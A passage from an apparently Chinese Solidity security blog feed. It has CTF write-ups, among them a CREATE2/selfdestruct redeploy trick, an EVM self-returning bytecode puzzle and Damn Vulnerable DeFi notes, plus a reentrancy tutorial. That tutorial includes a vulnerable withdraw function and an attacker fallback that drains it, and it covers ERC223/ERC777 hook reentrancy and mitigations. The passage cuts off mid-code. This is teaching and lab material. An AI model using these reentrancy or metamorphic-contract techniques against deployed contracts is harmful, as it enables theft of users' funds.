keccak256(init_code))[12:]</code></p><p>如果我们salt一样，合约的bytecodes一样那么是不是我们就创建了两个地址完全一样的合约了？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    bytes public deployBytecode;</span><br><span class="line">    address public deployedAddr;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code) public &#123;</span><br><span class="line">        deployBytecode = code;</span><br><span class="line">        address a;</span><br><span class="line">        // Compile Dumper to get this bytecode</span><br><span class="line">        bytes memory dumperBytecode = hex&#x27;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&#x27;;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x9453)</span><br><span class="line">        &#125;</span><br><span class="line">        deployedAddr = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Dumper &#123;</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        Deployer dp = Deployer(msg.sender);</span><br><span class="line">        bytes memory bytecode = dp.deployBytecode();</span><br><span class="line">        assembly &#123;</span><br><span class="line">            return (add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们在Deployer传入的code最终将会变成Dumper的bytecodes，这个创建方法真的很妙。这样既保证了我们需要的Dumper合约的bytecodes不变，又可以保证他的实际bytecode可以随意改变，真的太妙了。</p><p>开始攻击:</p><p>第一步 我们需要传入0x33ff,这个就是用来自毁的，创建好之后我们check一下，让攻击合约顺利通过，然后我们随便发一个transaction到Dumper使其自毁；</p><p>第二步 保持bytecode不变,salt不变。 我们重新creat2一个地址一样的Dumper合约，传入的code要触发sendFlag事件。然后完成合约。</p>]]></content>
      
      
      <categories>
          
          <category> -靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>重入攻击</title>
      <link href="/2023/04/05/solidity/%E7%B2%BE%E5%8D%8E/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"/>
      <url>/2023/04/05/solidity/%E7%B2%BE%E5%8D%8E/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>重入攻击是最常见的漏洞之一，重入漏洞的原理是基于递归原理。重入攻击的本质是由于外部调用或是使用transfer，send等转账时，导致合约的执行权落入攻击者手中，而此时如果一些重要的状态变量没有更新，攻击者就可以重入到该合约进行攻击。0.8.0版本后重入攻击受到了一定限制，但是仍然存在重入的风险。</p><h1 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h1><p>例一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint _amount) external payable &#123;</span><br><span class="line">    require (balances[msg.sender] &gt;= _amount,&quot;balance is insufficient&quot;);</span><br><span class="line">    (bool sent,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">    require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    balances[msg.sender] -= _amount;//漏洞！！1</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这是一个很简单的重入漏洞，在withdraw函数中它是先给呼叫合约转了帐，而后才修改变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(bool sent,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);步骤一</span><br><span class="line">balances[msg.sender] -= _amount;后修改变量  步骤二</span><br></pre></td></tr></table></figure><p>那么，如果msg.sender是一个合约，同时在收到目标合约发送的代币之后进行第二次调用withdraw，</p><p>第二次withdraw是在第一次调用的步骤一中进行，而第三次调用会在第二次的步骤一中进行，然后一二三次的步骤二会连续的执行，因此如果你输入的amount是5，那么你可以获取远远大于5的代币。这就像你银行账户有10块，当你取5块的时候，银行还未减少你账户余额的情况下，你又开始了第二次第三次的取款，最终钱到手了，管他银行怎么减少你账户的钱。</p><p>问题来了，如何在bool sent,) &#x3D; msg.sender.call{value: _amount}(“”);中实现这个功能呢？看代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fallback() <span class="keyword">external</span> payable &#123;</span><br><span class="line">        if (address(bank).balance <span class="operator">&gt;=</span> <span class="number">1</span> ether) &#123;</span><br><span class="line">                bank.withdraw(<span class="number">1</span> ether);</span><br><span class="line">            &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>当攻击合约接受到代币时他就会执行withdraw,那么我们一直在接受代币，一直在withdraw,那么钱不就到手了吗？需要注意的是你需要设定一个停止条件，就比如if (address(bank).balance &gt;&#x3D; 1 ether)；否则你会陷入死循环，然后交易失败。另一点需要注意的是，你有没有想过call的转账方式可以被重入，那么transfer,send的转账方式可以被重入吗？这就需要我们理解三种转账的区别了</p><p>· transfer 2300 gas,reverts · send   2300 gas returns bool · call - all gas,returns bool and data</p><p>观察可知，transfer与send只有2300gas的燃料，因此他们只能干一些简单是事情，这也告诉我们call转账比较危险，用的时候一定要检查是否有风险，因为它的操作空间可是很大的。</p><h1 id="重入思想的拓展"><a href="#重入思想的拓展" class="headerlink" title="重入思想的拓展"></a>重入思想的拓展</h1><p>例二</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function deleteUser()public&#123;     </span><br><span class="line">    uint256 len = users[msg.sender].length;</span><br><span class="line">    User memory user = users[msg.sender][len-1];</span><br><span class="line">    bool success =msg.sender.call.value(user.balance)();</span><br><span class="line">    require(success,&quot;transfer error&quot;);</span><br><span class="line"></span><br><span class="line">    users[msg.sender].length--;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的：如何调用一次deleteUser而让length减少2</p><p>解题概述：我们可以看到在函数内正常的情况下我们只能让让length–，根本无法满足我们的目的，但是有call,那么我们就可以用刚才的重入思想攻击他，完成目标（在攻击合约的fallback函数中在调用一次deleteUser）。</p><p>题目很简单，和上一步的重入几乎一样，但是这题的目的可不是为了代币，而是为了达到另一种目的，因此我想表达的是：不要局限在重入攻击对代币的窃取，重入攻击可以用于对数据的多次操作（既一次调用多次改变），从而造成重大漏洞，当然重入漏洞最早发生在对代币的窃取。但也不可忽视其对数据状态的多次操作。</p><h1 id="解决漏洞方案"><a href="#解决漏洞方案" class="headerlink" title="解决漏洞方案"></a>解决漏洞方案</h1><h2 id="用transfer-send转账函数"><a href="#用transfer-send转账函数" class="headerlink" title="用transfer,send转账函数"></a>用transfer,send转账函数</h2><p>因为两者都有gas限制，因此无法完成重入这样复杂的多次调用，可以有效避免重入攻击。</p><h2 id="先修改状态变量后调用函数"><a href="#先修改状态变量后调用函数" class="headerlink" title="先修改状态变量后调用函数"></a>先修改状态变量后调用函数</h2><p>以例一为例</p><p>如果我们将目标合约代码改写为如下合约，那么我们还会被攻击吗？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Bank &#123;</span><br><span class="line"> mapping(address =&gt; uint) public balances;</span><br><span class="line"> function withdraw(uint _amount) external payable &#123;</span><br><span class="line">     require (balances[msg.sender] &gt;= _amount,&quot;balance is insufficient&quot;);</span><br><span class="line">     balances[msg.sender] -= _amount;</span><br><span class="line">     (bool sent,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">     require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     function deposit() public payable &#123;</span><br><span class="line">          balances[msg.sender] += msg.value;</span><br><span class="line">          &#125;</span><br><span class="line">          function getBalance() external view returns (uint) &#123;</span><br><span class="line">              return address(this).balance;</span><br><span class="line">              &#125;</span><br><span class="line">              constructor() payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只是把状态变量的修改提前到调用外部函数之前就预防了重入。因为状态变量修改之后，你再次调用外部函数，就有可能会被require (balances[msg.sender] &gt;&#x3D; _amount,”balance is insufficient”);这一步阻挡（除非你钱多多）。</p><h2 id="给函数上锁"><a href="#给函数上锁" class="headerlink" title="给函数上锁"></a>给函数上锁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bool Lock=false;</span><br><span class="line">function withdraw(uint _amount) external payable &#123;</span><br><span class="line">    require(!Lock,&quot;Failed to call&quot;);</span><br><span class="line">    Lock=true;</span><br><span class="line">    require (balances[msg.sender] &gt;= _amount,&quot;balance is insufficient&quot;);</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    (bool sent,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">    require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    Lock=false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样，我已经上锁了，你重入的时候直接被阻挡在require(!Lock,”Failed to call”);指的一提的是，0.8.0版本以上也是采用了加锁的原理来防止重入的。</p><h2 id="设置gas费用"><a href="#设置gas费用" class="headerlink" title="设置gas费用"></a>设置gas费用</h2><p>给call函数设置限定的gas可以在一定程度上防止重入，但这并不是很好的办法，应该从根源上杜绝，设置gas费只能是无奈之举</p><h1 id="ERC223的重入"><a href="#ERC223的重入" class="headerlink" title="ERC223的重入"></a>ERC223的重入</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//被攻击的ERC223合约</span></span><br><span class="line">    bool flag=<span class="literal">true</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">airdrop</span>(<span class="params">address getAirdrop</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(flag);</span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">transfer</span>(getAirdrop, <span class="number">100</span> * <span class="number">10</span>**<span class="number">18</span>));</span><br><span class="line">        balanceOf[getAirdrop] += <span class="number">100</span> * <span class="number">10</span>**<span class="number">18</span>;</span><br><span class="line">        balanceOf[<span class="title function_">address</span>(<span class="variable language_">this</span>)] -= <span class="number">100</span> * <span class="number">10</span>**<span class="number">18</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;balanceOf[getAirdrop]&quot;</span>,balanceOf[getAirdrop]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;balanceOf[this]&quot;</span>,balanceOf[<span class="title function_">address</span>(<span class="variable language_">this</span>)]);</span><br><span class="line">        flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_transfer</span>(<span class="params">address <span class="keyword">from</span>,address to,uint256 amount,bytes memory data</span>) internal virtual &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="keyword">from</span> != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: transfer from the zero address&quot;</span>);</span><br><span class="line">    <span class="built_in">require</span>(to != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: transfer to the zero address&quot;</span>);</span><br><span class="line">    uint256 fromBalance = balances[<span class="keyword">from</span>];</span><br><span class="line">    <span class="built_in">require</span>(fromBalance &gt;= amount, <span class="string">&quot;ERC20: transfer amount exceeds balance&quot;</span>);</span><br><span class="line"></span><br><span class="line">    unchecked &#123;</span><br><span class="line">      balances[<span class="keyword">from</span>] = fromBalance - amount;</span><br><span class="line">      <span class="comment">// Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span></span><br><span class="line">      <span class="comment">// decrementing then incrementing.</span></span><br><span class="line">      balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Address</span>.<span class="title function_">isContract</span>(to)) &#123;</span><br><span class="line">      <span class="title class_">IERC223Recipient</span>(to).<span class="title function_">tokenReceived</span>(msg.<span class="property">sender</span>, amount, data);</span><br><span class="line">    &#125;</span><br><span class="line">    emit <span class="title class_">Transfer</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">_afterTokenTransfer</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到这个转账合约是无法触发fallback的，但我们注意，ERC223相对于ERC20增加了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (Address.isContract(to)) &#123;</span><br><span class="line">     IERC223Recipient(to).tokenReceived(msg.sender, amount, data);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>原本是为了防止意外发送的代币被合约接受，但增加了重入的风险。我们看到airdrop只能操作一次（flag&#x3D;false）。但是我们发现他是在函数最后才修改了变量，那我们可不可以在进行airdrop的时候再次airdrop呢？。而transfer中又调用了外部合约的tokenReceived,那么如果我们在tokenReceived中再次调用airdrop是不是就可以免费获取更多钱了？</p><h1 id="ERC777重入"><a href="#ERC777重入" class="headerlink" title="ERC777重入"></a>ERC777重入</h1><p>ERC777挂钩（一个安全机制）是与转账方和接收方帐户绑定（挂钩）的代码段。实质上,它们是智能合约实例:</p><ol><li>IERC777Sender接口有一个函数<code>tokensToSend</code></li><li>IERC777Recipient接口有一个函数<code>tokensReceived</code></li></ol><p>这两个接口的智能合约的地址实例存储在ERC1820注册表中,与它们“挂钩”的地址配对。</p><p>这两个合约的的地址是储存在<a href="https://link.zhihu.com/?target=https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1820.md">ERC1820注册表</a>中。两个函数的功能不细讲，但是这两个函数对于ERC777而言是一个外部函数。</p><p>ERC777挂钩的引入使我们能够增强ERC777代币的转账功能，即使在部署代币之后也是如此。它还提供了取消交易的可能性，但是正因如此也引起了不小的漏洞。</p><p>下面两个函数是ERC777里面调用外部的函数的源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function _callTokensToSend(address operator,address from,address to,uint256 amount,bytes memory userData,bytes memory operatorData) private &#123;</span><br><span class="line">        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(from, _TOKENS_SENDER_INTERFACE_HASH);</span><br><span class="line">        if (implementer != address(0)) &#123;</span><br><span class="line">            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">function _callTokensReceived(address operator,address from,address to,uint256 amount,bytes memory userData,bytes memory operatorData,bool requireReceptionAck) private &#123;</span><br><span class="line">        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(to, _TOKENS_RECIPIENT_INTERFACE_HASH);</span><br><span class="line">        if (implementer != address(0)) &#123;</span><br><span class="line">            IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);</span><br><span class="line">        &#125; else if (requireReceptionAck) &#123;</span><br><span class="line">            require(!to.isContract(), &quot;ERC777: token recipient contract has no implementer for ERC777TokensRecipient&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到在tokensToSend与tokensReceived的操作空间是很大的，因此如果攻击合约自己写一个攻击合约并且实现了这两个函数，那么攻击合约就可以在这两个函数中实现重入的操纵，从而造成危险。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>重入攻击是一种递归思想，在状态变量未及时修改时，攻击者利用各种方法展开递归，从而造成损失，因此要特别注意状态变量的及时修改，以及调用外部函数的安全性，虽然0.8.0版本以上重入变得困难，但是一但失误造成的损失是致命的。检查以及测试合约显得格外重要。</p>]]></content>
      
      
      <categories>
          
          <category> -知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>EVM构造code的题</title>
      <link href="/2023/04/05/solidity/%E7%B2%BE%E5%8D%8E/EVM%E6%9E%84%E9%80%A0code%E9%A2%98/"/>
      <url>/2023/04/05/solidity/%E7%B2%BE%E5%8D%8E/EVM%E6%9E%84%E9%80%A0code%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="构造出一个返回值与code相等的字节码"><a href="#构造出一个返回值与code相等的字节码" class="headerlink" title="构造出一个返回值与code相等的字节码"></a>构造出一个返回值与code相等的字节码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line"></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.16</span>;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    constructor(bytes memory code) &#123; assembly &#123; <span class="keyword">return</span> (add(code, <span class="number">0x20</span>), mload(code)) &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> public solved = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">safe</span><span class="params">(bytes memory code)</span> private pure <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        uint i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; code.length) &#123;</span><br><span class="line">            uint8 op = uint8(code[i]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op &gt;= <span class="number">0x30</span> &amp;&amp; op &lt;= <span class="number">0x48</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                   op == <span class="number">0x54</span> <span class="comment">// SLOAD</span></span><br><span class="line">                || op == <span class="number">0x55</span> <span class="comment">// SSTORE</span></span><br><span class="line">                || op == <span class="number">0xF0</span> <span class="comment">// CREATE</span></span><br><span class="line">                || op == <span class="number">0xF1</span> <span class="comment">// CALL</span></span><br><span class="line">                || op == <span class="number">0xF2</span> <span class="comment">// CALLCODE</span></span><br><span class="line">                || op == <span class="number">0xF4</span> <span class="comment">// DELEGATECALL</span></span><br><span class="line">                || op == <span class="number">0xF5</span> <span class="comment">// CREATE2</span></span><br><span class="line">                || op == <span class="number">0xFA</span> <span class="comment">// STATICCALL</span></span><br><span class="line">                || op == <span class="number">0xFF</span> <span class="comment">// SELFDESTRUCT</span></span><br><span class="line">            ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (op &gt;= <span class="number">0x60</span> &amp;&amp; op &lt; <span class="number">0x80</span>) i += (op - <span class="number">0x60</span>) + <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">solve</span><span class="params">(bytes memory code)</span> external &#123;</span><br><span class="line">        require(code.length &gt; <span class="number">0</span>);</span><br><span class="line">        require(safe(code), <span class="string">&quot;deploy/code-unsafe&quot;</span>);</span><br><span class="line">        address target = address(new Deployer(code));</span><br><span class="line">        (<span class="type">bool</span> ok, bytes memory result) = target.staticcall(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        require(</span><br><span class="line">            ok &amp;&amp;</span><br><span class="line">            keccak256(code) == target.codehash &amp;&amp;</span><br><span class="line">            keccak256(result) == target.codehash</span><br><span class="line">        );</span><br><span class="line">        solved = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Setup &#123;</span><br><span class="line">    </span><br><span class="line">    Challenge public challenge;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        challenge = new Challenge();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">isSolved</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> challenge.solved();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理<br>如果没有require(safe(code), “deploy&#x2F;code-unsafe”);<br>CODE: 0x600C6000600039600C6000F3</p><p>PUSH1:     ??    600C  指要COPY的code的长度<br>PUSH1:     00    6000  指要从哪个位置开始COPY<br>PUSH1:     00    6000  指要COPY到内存的哪个位置<br>CODECOPY         39</p><p>PUSH1      ??    600C  指要读取的数据的长度<br>PUSH1      00    6000  指要从内存的指定位置开始读取<br>RETURN     F3    F3 </p><p>当有require(safe(code), “deploy&#x2F;code-unsafe”);<br>CODE: 7F80607F60005360015260215260416000F300000000000000000000000000000080607F60005360015260215260416000F3000000000000000000000000000000</p><p>PUSH32  (??)    7F(??)<br>DUP1    80      80    复制一份</p><p>PUSH1   7F      607F   要存入内存的数据<br>PUSH1   00      6000   存入内存的地点<br>MSTORE8 53      53  </p><p>PUSH1   01      6001<br>MSTORE  52      52</p><p>PUSH1   21      6021<br>MSTORE  52      52</p><p>PUSH1   41      6041<br>PUSH1   00      6000<br>RETURN  F3      F3<br>STOP（*15）    00</p><p>CODE:7F(??)80607F60005360015260215260416000F3 000000000000000000000000000000<br>memory:7F(??)(??)<br>题目主要考察EVM字节码的构造，需要熟知才能运用自如</p>]]></content>
      
      
      <categories>
          
          <category> -靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>html5</title>
      <link href="/2023/03/28/htm5%E7%BD%91%E9%A1%B5%E8%AE%BE%E8%AE%A1/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/03/28/htm5%E7%BD%91%E9%A1%B5%E8%AE%BE%E8%AE%A1/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="看官网语法即可"><a href="#看官网语法即可" class="headerlink" title="看官网语法即可"></a>看官网语法即可</h1><p>官网链接<a href="https://www.w3school.com.cn/html/html5_intro.asp">MarkDown</a><br>[<a href="https://www.w3school.com.cn/html/html5_intro.asp]">https://www.w3school.com.cn/html/html5_intro.asp]</a></p>]]></content>
      
      
      <categories>
          
          <category> -html学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity靶场</title>
      <link href="/2023/03/28/solidity/%E6%9D%82%E4%B9%B1/Damn%20Vulnerable%20DeFi/"/>
      <url>/2023/03/28/solidity/%E6%9D%82%E4%B9%B1/Damn%20Vulnerable%20DeFi/</url>
      
        <content type="html"><![CDATA[<h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p><a href="https://www.damnvulnerabledefi.xyz/challenges/unstoppable/">题目源代码</a></p><p>UnstoppableVault中的flashLoan有漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不通过depositTokens函数给合约传钱就可以让poolbalance与合约余额不相等，</span><br><span class="line">从而使贷款中的这一句无法通过，直接revert，从而使闪电贷无法使用</span><br><span class="line"> <span class="keyword">if</span> (convertToShares(totalSupply) != balanceBefore) revert <span class="title function_">InvalidBalance</span><span class="params">()</span>;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><p><a href="https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/">题目源代码</a></p><p>NaiveReceiverLenderPool.sol中的flashLoan出现了漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">flashLoan</span><span class="params">(</span></span><br><span class="line"><span class="params">        IERC3156FlashBorrower receiver,</span></span><br><span class="line"><span class="params">        address token,</span></span><br><span class="line"><span class="params">        uint256 amount,</span></span><br><span class="line"><span class="params">        bytes calldata data</span></span><br><span class="line"><span class="params">    )</span> external <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (token != ETH)</span><br><span class="line">            revert <span class="title function_">UnsupportedCurrency</span><span class="params">()</span>;</span><br><span class="line">        </span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span 